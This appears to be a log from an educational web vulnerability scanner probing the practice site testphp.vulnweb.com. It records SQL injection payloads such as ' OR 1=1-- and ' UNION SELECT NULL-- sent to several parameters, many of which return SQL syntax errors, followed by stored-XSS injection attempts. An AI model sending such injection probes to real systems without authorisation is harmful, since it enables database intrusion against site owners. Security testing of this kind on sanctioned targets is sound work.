+2025-11-10 11:21:58,515 INFO: [SQLi-LEN] file=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27+UNION+SELECT+NULL--
+2025-11-10 11:21:58,515 INFO: [SQLi-DOM] file=' UNION SELECT NULL-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27+UNION+SELECT+NULL--
+2025-11-10 11:21:59,454 INFO: [SQLi-LEN] file=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27+OR+1%3D1--
+2025-11-10 11:21:59,456 INFO: [SQLi-DOM] file=' OR 1=1-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27+OR+1%3D1--
+2025-11-10 11:22:00,437 INFO: [SQLi-LEN] file=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%22+OR+1%3D1--
+2025-11-10 11:22:00,439 INFO: [SQLi-DOM] file=" OR 1=1-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%22+OR+1%3D1--
+2025-11-10 11:22:00,440 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=6
+2025-11-10 11:22:02,187 INFO: [SQLi] pic=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%27
+2025-11-10 11:22:02,187 INFO: [SQLi-LEN] pic=' caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%27
+2025-11-10 11:22:02,192 INFO: [SQLi-DOM] pic=' caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=6%27
+2025-11-10 11:22:03,136 INFO: [SQLi] pic=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%27+OR+%271%27%3D%271
+2025-11-10 11:22:03,137 INFO: [SQLi-LEN] pic=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%27+OR+%271%27%3D%271
+2025-11-10 11:22:03,144 INFO: [SQLi-DOM] pic=' OR '1'='1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=6%27+OR+%271%27%3D%271
+2025-11-10 11:22:03,933 INFO: [SQLi] pic=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%22
+2025-11-10 11:22:03,933 INFO: [SQLi-LEN] pic=" caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%22
+2025-11-10 11:22:03,939 INFO: [SQLi-DOM] pic=" caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=6%22
+2025-11-10 11:22:04,736 INFO: [SQLi] pic=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%22+OR+%221%22%3D%221
+2025-11-10 11:22:04,736 INFO: [SQLi-LEN] pic=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%22+OR+%221%22%3D%221
+2025-11-10 11:22:04,743 INFO: [SQLi-DOM] pic=" OR "1"="1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=6%22+OR+%221%22%3D%221
+2025-11-10 11:22:05,552 INFO: [SQLi] pic=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%60
+2025-11-10 11:22:05,552 INFO: [SQLi-LEN] pic=` caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%60
+2025-11-10 11:22:05,562 INFO: [SQLi-DOM] pic=` caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=6%60
+2025-11-10 11:22:06,369 INFO: [SQLi] pic=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%27%29--
+2025-11-10 11:22:06,369 INFO: [SQLi-LEN] pic=')-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%27%29--
+2025-11-10 11:22:06,376 INFO: [SQLi-DOM] pic=')-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=6%27%29--
+2025-11-10 11:22:07,302 INFO: [SQLi] pic=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%27+UNION+SELECT+NULL--
+2025-11-10 11:22:07,303 INFO: [SQLi-LEN] pic=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%27+UNION+SELECT+NULL--
+2025-11-10 11:22:07,311 INFO: [SQLi-DOM] pic=' UNION SELECT NULL-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=6%27+UNION+SELECT+NULL--
+2025-11-10 11:22:08,269 INFO: [SQLi] pic=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%27+OR+1%3D1--
+2025-11-10 11:22:08,269 INFO: [SQLi-LEN] pic=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%27+OR+1%3D1--
+2025-11-10 11:22:08,272 INFO: [SQLi-DOM] pic=' OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=6%27+OR+1%3D1--
+2025-11-10 11:22:09,235 INFO: [SQLi] pic=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%22+OR+1%3D1--
+2025-11-10 11:22:09,236 INFO: [SQLi-LEN] pic=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%22+OR+1%3D1--
+2025-11-10 11:22:09,244 INFO: [SQLi-DOM] pic=" OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=6%22+OR+1%3D1--
+2025-11-10 11:22:09,244 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg
+2025-11-10 11:22:11,141 INFO: [SQLi-LEN] file=' caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27
+2025-11-10 11:22:11,144 INFO: [SQLi-DOM] file=' caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27
+2025-11-10 11:22:11,969 INFO: [SQLi-LEN] file=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27+OR+%271%27%3D%271
+2025-11-10 11:22:11,971 INFO: [SQLi-DOM] file=' OR '1'='1 caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27+OR+%271%27%3D%271
+2025-11-10 11:22:12,752 INFO: [SQLi-LEN] file=" caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%22
+2025-11-10 11:22:12,752 INFO: [SQLi-DOM] file=" caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%22
+2025-11-10 11:22:13,584 INFO: [SQLi-LEN] file=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%22+OR+%221%22%3D%221
+2025-11-10 11:22:13,585 INFO: [SQLi-DOM] file=" OR "1"="1 caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%22+OR+%221%22%3D%221
+2025-11-10 11:22:14,403 INFO: [SQLi-LEN] file=` caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%60
+2025-11-10 11:22:14,405 INFO: [SQLi-DOM] file=` caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%60
+2025-11-10 11:22:15,308 INFO: [SQLi-LEN] file=')-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27%29--
+2025-11-10 11:22:15,308 INFO: [SQLi-DOM] file=')-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27%29--
+2025-11-10 11:22:16,284 INFO: [SQLi-LEN] file=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27+UNION+SELECT+NULL--
+2025-11-10 11:22:16,284 INFO: [SQLi-DOM] file=' UNION SELECT NULL-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27+UNION+SELECT+NULL--
+2025-11-10 11:22:17,102 INFO: [SQLi-LEN] file=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27+OR+1%3D1--
+2025-11-10 11:22:17,104 INFO: [SQLi-DOM] file=' OR 1=1-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27+OR+1%3D1--
+2025-11-10 11:22:18,032 INFO: [SQLi-LEN] file=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%22+OR+1%3D1--
+2025-11-10 11:22:18,034 INFO: [SQLi-DOM] file=" OR 1=1-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%22+OR+1%3D1--
+2025-11-10 11:22:18,034 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?artist=1
+2025-11-10 11:22:19,949 INFO: [SQLi] artist=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%27
+2025-11-10 11:22:19,950 INFO: [SQLi-LEN] artist=' caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%27
+2025-11-10 11:22:19,953 INFO: [SQLi-DOM] artist=' caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=1%27
+2025-11-10 11:22:20,765 INFO: [SQLi] artist=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%27+OR+%271%27%3D%271
+2025-11-10 11:22:20,767 INFO: [SQLi-LEN] artist=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%27+OR+%271%27%3D%271
+2025-11-10 11:22:20,800 INFO: [SQLi-DOM] artist=' OR '1'='1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=1%27+OR+%271%27%3D%271
+2025-11-10 11:22:21,700 INFO: [SQLi] artist=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%22
+2025-11-10 11:22:21,701 INFO: [SQLi-LEN] artist=" caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%22
+2025-11-10 11:22:21,731 INFO: [SQLi-DOM] artist=" caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=1%22
+2025-11-10 11:22:22,667 INFO: [SQLi] artist=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%22+OR+%221%22%3D%221
+2025-11-10 11:22:22,667 INFO: [SQLi-LEN] artist=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%22+OR+%221%22%3D%221
+2025-11-10 11:22:22,692 INFO: [SQLi-DOM] artist=" OR "1"="1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=1%22+OR+%221%22%3D%221
+2025-11-10 11:22:23,495 INFO: [SQLi] artist=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%60
+2025-11-10 11:22:23,496 INFO: [SQLi-LEN] artist=` caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%60
+2025-11-10 11:22:23,518 INFO: [SQLi-DOM] artist=` caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=1%60
+2025-11-10 11:22:24,314 INFO: [SQLi] artist=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%27%29--
+2025-11-10 11:22:24,316 INFO: [SQLi-LEN] artist=')-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%27%29--
+2025-11-10 11:22:24,341 INFO: [SQLi-DOM] artist=')-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=1%27%29--
+2025-11-10 11:22:25,229 INFO: [SQLi] artist=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%27+UNION+SELECT+NULL--
+2025-11-10 11:22:25,231 INFO: [SQLi-LEN] artist=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%27+UNION+SELECT+NULL--
+2025-11-10 11:22:25,257 INFO: [SQLi-DOM] artist=' UNION SELECT NULL-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=1%27+UNION+SELECT+NULL--
+2025-11-10 11:22:26,040 INFO: [SQLi] artist=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%27+OR+1%3D1--
+2025-11-10 11:22:26,040 INFO: [SQLi-LEN] artist=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%27+OR+1%3D1--
+2025-11-10 11:22:26,054 INFO: [SQLi-DOM] artist=' OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=1%27+OR+1%3D1--
+2025-11-10 11:22:26,854 INFO: [SQLi] artist=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%22+OR+1%3D1--
+2025-11-10 11:22:26,856 INFO: [SQLi-LEN] artist=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%22+OR+1%3D1--
+2025-11-10 11:22:26,880 INFO: [SQLi-DOM] artist=" OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=1%22+OR+1%3D1--
+2025-11-10 11:22:26,882 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?artist=2
+2025-11-10 11:22:28,586 INFO: [SQLi] artist=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%27
+2025-11-10 11:22:28,589 INFO: [SQLi-LEN] artist=' caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%27
+2025-11-10 11:22:28,617 INFO: [SQLi-DOM] artist=' caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=2%27
+2025-11-10 11:22:29,452 INFO: [SQLi] artist=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%27+OR+%271%27%3D%271
+2025-11-10 11:22:29,456 INFO: [SQLi-LEN] artist=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%27+OR+%271%27%3D%271
+2025-11-10 11:22:29,518 INFO: [SQLi-DOM] artist=' OR '1'='1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=2%27+OR+%271%27%3D%271
+2025-11-10 11:22:30,667 INFO: [SQLi] artist=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%22
+2025-11-10 11:22:30,668 INFO: [SQLi-LEN] artist=" caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%22
+2025-11-10 11:22:30,688 INFO: [SQLi-DOM] artist=" caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=2%22
+2025-11-10 11:22:31,483 INFO: [SQLi] artist=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%22+OR+%221%22%3D%221
+2025-11-10 11:22:31,485 INFO: [SQLi-LEN] artist=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%22+OR+%221%22%3D%221
+2025-11-10 11:22:31,505 INFO: [SQLi-DOM] artist=" OR "1"="1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=2%22+OR+%221%22%3D%221
+2025-11-10 11:22:32,301 INFO: [SQLi] artist=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%60
+2025-11-10 11:22:32,303 INFO: [SQLi-LEN] artist=` caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%60
+2025-11-10 11:22:32,327 INFO: [SQLi-DOM] artist=` caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=2%60
+2025-11-10 11:22:33,247 INFO: [SQLi] artist=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%27%29--
+2025-11-10 11:22:33,256 INFO: [SQLi-LEN] artist=')-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%27%29--
+2025-11-10 11:22:33,277 INFO: [SQLi-DOM] artist=')-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=2%27%29--
+2025-11-10 11:22:34,118 INFO: [SQLi] artist=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%27+UNION+SELECT+NULL--
+2025-11-10 11:22:34,119 INFO: [SQLi-LEN] artist=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%27+UNION+SELECT+NULL--
+2025-11-10 11:22:34,138 INFO: [SQLi-DOM] artist=' UNION SELECT NULL-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=2%27+UNION+SELECT+NULL--
+2025-11-10 11:22:34,941 INFO: [SQLi] artist=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%27+OR+1%3D1--
+2025-11-10 11:22:34,942 INFO: [SQLi-LEN] artist=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%27+OR+1%3D1--
+2025-11-10 11:22:34,964 INFO: [SQLi-DOM] artist=' OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=2%27+OR+1%3D1--
+2025-11-10 11:22:35,801 INFO: [SQLi] artist=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%22+OR+1%3D1--
+2025-11-10 11:22:35,802 INFO: [SQLi-LEN] artist=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%22+OR+1%3D1--
+2025-11-10 11:22:35,821 INFO: [SQLi-DOM] artist=" OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?artist=2%22+OR+1%3D1--
+2025-11-10 11:22:35,828 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?artist=3
+2025-11-10 11:22:37,414 INFO: [SQLi] artist=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%27
+2025-11-10 11:22:37,416 INFO: [SQLi-LEN] artist=' caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%27
+2025-11-10 11:22:37,434 INFO: [SQLi-DOM] artist=' caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?artist=3%27
+2025-11-10 11:22:38,238 INFO: [SQLi] artist=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%27+OR+%271%27%3D%271
+2025-11-10 11:22:38,238 INFO: [SQLi-LEN] artist=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%27+OR+%271%27%3D%271
+2025-11-10 11:22:38,264 INFO: [SQLi-DOM] artist=' OR '1'='1 caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?artist=3%27+OR+%271%27%3D%271
+2025-11-10 11:22:39,105 INFO: [SQLi] artist=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%22
+2025-11-10 11:22:39,106 INFO: [SQLi-LEN] artist=" caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%22
+2025-11-10 11:22:39,126 INFO: [SQLi-DOM] artist=" caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?artist=3%22
+2025-11-10 11:22:40,556 INFO: [SQLi] artist=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%22+OR+%221%22%3D%221
+2025-11-10 11:22:40,558 INFO: [SQLi-LEN] artist=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%22+OR+%221%22%3D%221
+2025-11-10 11:22:40,576 INFO: [SQLi-DOM] artist=" OR "1"="1 caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?artist=3%22+OR+%221%22%3D%221
+2025-11-10 11:22:41,501 INFO: [SQLi] artist=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%60
+2025-11-10 11:22:41,502 INFO: [SQLi-LEN] artist=` caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%60
+2025-11-10 11:22:41,511 INFO: [SQLi-DOM] artist=` caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?artist=3%60
+2025-11-10 11:22:42,305 INFO: [SQLi] artist=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%27%29--
+2025-11-10 11:22:42,306 INFO: [SQLi-LEN] artist=')-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%27%29--
+2025-11-10 11:22:42,324 INFO: [SQLi-DOM] artist=')-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?artist=3%27%29--
+2025-11-10 11:22:43,299 INFO: [SQLi] artist=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%27+UNION+SELECT+NULL--
+2025-11-10 11:22:43,301 INFO: [SQLi-LEN] artist=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%27+UNION+SELECT+NULL--
+2025-11-10 11:22:43,321 INFO: [SQLi-DOM] artist=' UNION SELECT NULL-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?artist=3%27+UNION+SELECT+NULL--
+2025-11-10 11:22:45,039 INFO: [SQLi] artist=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%27+OR+1%3D1--
+2025-11-10 11:22:45,040 INFO: [SQLi-LEN] artist=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%27+OR+1%3D1--
+2025-11-10 11:22:45,060 INFO: [SQLi-DOM] artist=' OR 1=1-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?artist=3%27+OR+1%3D1--
+2025-11-10 11:22:46,034 INFO: [SQLi] artist=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%22+OR+1%3D1--
+2025-11-10 11:22:46,034 INFO: [SQLi-LEN] artist=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%22+OR+1%3D1--
+2025-11-10 11:22:46,061 INFO: [SQLi-DOM] artist=" OR 1=1-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?artist=3%22+OR+1%3D1--
+2025-11-10 11:22:46,067 INFO: Testing parameters at: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
+2025-11-10 11:23:28,901 INFO: Starting stored-XSS checks (this will submit data to forms). Run only with permission.
+2025-11-10 11:23:30,955 INFO: [Stored-XSS] Injected payload into http://testphp.vulnweb.com/search.php?test=query (method=post)
+2025-11-10 11:23:32,620 INFO: [Stored-XSS] Injected payload into http://testphp.vulnweb.com/search.php?test=query (method=post)
+2025-11-10 11:23:34,949 INFO: [Stored-XSS] Injected payload into http://testphp.vulnweb.com/search.php?test=query (method=post)
+2025-11-10 11:23:36,541 INFO: [Stored-XSS] Injected payload into http://testphp.vulnweb.com/search.php?test=query (method=post)
+2025-11-10 11:23:38,170 INFO: [Stored-XSS] Injected payload into http://testphp.vulnweb.com/search.php?test=query (method=post)
+2025-11-10 11:23:54,518 WARNING: [Stored-XSS] Injection failed at http://testphp.vulnweb.com/search.php?test=query: HTTPConnectionPool(host='testphp.vulnweb.com', port=80): Read timed out. (read timeout=15)
+2025-11-10 11:23:56,781 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251110T055354Z.json', 'csv': 'reports\\edu_scan_report_20251110T055354Z.csv', 'html': 'reports\\edu_scan_report_20251110T055354Z.html', 'pdf': 'reports\\edu_scan_report_20251110T055354Z.pdf'}
+2025-11-11 00:01:28,842 ERROR: Login error: Invalid URL '': No scheme supplied. Perhaps you meant https://?
